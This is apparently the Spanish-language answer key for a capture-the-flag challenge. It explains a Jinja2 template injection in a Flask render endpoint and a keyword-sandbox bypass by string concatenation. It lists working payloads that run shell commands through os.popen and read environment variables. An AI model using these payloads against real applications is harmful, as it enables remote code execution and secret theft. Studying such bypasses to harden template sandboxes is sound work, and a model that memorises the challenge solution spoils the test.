# Solution: web-ssti-chain

## Vulnerability Chain

1. **SSTI en el editor de plantillas** - El endpoint `/render` acepta plantillas Jinja2 arbitrarias
   y las renderiza con `app.jinja_env.from_string()`, que tiene acceso completo al entorno Flask
   incluyendo globals como `cycler`, `namespace`, `lipsum`, etc.
2. **Bypass del sandbox via concatenacion** - El sandbox hace `blocked_string in template_src`,
   inspeccionando el texto literal de la plantilla ANTES del renderizado. El operador `~` de Jinja2
   concatena strings en TIEMPO DE EJECUCION, despues de la inspeccion del sandbox.
3. **Acceso al OS via globals de Jinja2** - Los globals `cycler`, `namespace`, `lipsum` tienen
   acceso a `__init__.__globals__` que incluye el modulo `os`.

## Por que funciona el bypass

El sandbox bloquea `'os'` (con comillas) y `popen` como strings literales.

Usando el operador `~` (tilde) de Jinja2 para concatenar en runtime:
- `'po' ~ 'pen'` produce `'popen'` en tiempo de renderizado, pero el sandbox solo ve `'po' ~ 'pen'`
- `'o' ~ 's'` produce `'os'`, pero el sandbox solo ve `'o' ~ 's'`

Los globals de Jinja2 como `cycler` (clase Python) tienen `__init__.__globals__` que incluye
el modulo `os` bajo la clave `'os'`.

## Payload de bypass (opcion 1: via cycler)

```
{{ cycler.__init__.__globals__[('o'~'s')][('po'~'pen')]('cat /flag.txt').read() }}
```

Desglose:
- `cycler.__init__.__globals__` - diccionario de globals del modulo donde vive cycler
- `[('o'~'s')]` - accede a la clave `'os'` (concatenada en runtime, no en sandbox check)
- `[('po'~'pen')]` - accede al metodo `popen` de os
- `('cat /flag.txt').read()` - ejecuta el comando y lee el output

## Payload de bypass (opcion 2: via namespace)

```
{{ namespace.__init__.__globals__[('o'~'s')][('po'~'pen')]('cat /flag.txt').read() }}
```

## Payload de bypass (opcion 3: via lipsum)

```
{{ lipsum.__globals__[('o'~'s')][('po'~'pen')]('cat /flag.txt').read() }}
```

## Payload de bypass (opcion 4: leer env var directamente)

```
{{ cycler.__init__.__globals__[('o'~'s')].environ.get('FLAG') }}
```

## Demostracion paso a paso

1. Ir a `http://TARGET:8080/render`
2. Pegar el payload en el editor:
   ```
   {{ cycler.__init__.__globals__[('o'~'s')][('po'~'pen')]('cat /flag.txt').read() }}
   ```
3. Click "Renderizar"
4. La salida mostrara el contenido de `/flag.txt`: `HL4{...}`

## Por que el sandbox falla

El sandbox busca estos strings LITERALES en el codigo fuente de la plantilla:
- `popen` - NO aparece en el payload (aparece `'po'~'pen'`)
- `'os'` - NO aparece (aparece `'o'~'s'`)
- `os.path` - NO aparece
- `__class__`, `__base__`, etc. - NO se usan en este vector

El bypass NO requiere login. El endpoint `/render` es publico.

## Variantes adicionales

```jinja
{# RCE con whoami #}
{{ cycler.__init__.__globals__[('o'~'s')][('po'~'pen')]('id').read() }}

{# Listar archivos #}
{{ cycler.__init__.__globals__[('o'~'s')][('po'~'pen')]('ls /').read() }}

{# Leer variables de entorno #}
{{ cycler.__init__.__globals__[('o'~'s')].environ }}
```
